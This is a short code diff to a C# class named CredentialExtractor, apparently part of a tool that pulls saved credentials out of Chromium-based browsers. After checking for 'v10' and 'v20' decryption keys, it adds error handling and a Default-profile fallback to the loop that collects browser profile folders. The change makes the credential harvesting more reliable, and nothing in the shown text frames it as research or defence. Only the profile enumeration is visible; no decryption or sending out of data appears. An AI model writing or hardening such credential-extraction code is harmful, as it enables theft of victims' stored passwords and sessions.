@@ -121,11 +121,21 @@ public static class CredentialExtractor
         if (v10Key == null && v20Key == null) return creds;
 
         var profileDirs = new List<string>();
-        foreach (var dir in Directory.GetDirectories(userDataPath))
+        try
         {
-            string n = Path.GetFileName(dir).ToLowerInvariant();
-            if (n == "default" || n.StartsWith("profile "))
-                profileDirs.Add(dir);
+            foreach (var dir in Directory.GetDirectories(userDataPath))
+            {
+                string n = Path.GetFileName(dir).ToLowerInvariant();
+                if (n == "default" || n.StartsWith("profile "))
+                    profileDirs.Add(dir);
+            }
+        }
+        catch (Exception ex)
+        {
+            Log($"Error listing profiles in {userDataPath}: {ex.Message}");
+            string defPath = Path.Combine(userDataPath, "Default");
+            if (Directory.Exists(defPath))
+                profileDirs.Add(defPath);
         }
 
         foreach (var profile in profileDirs)
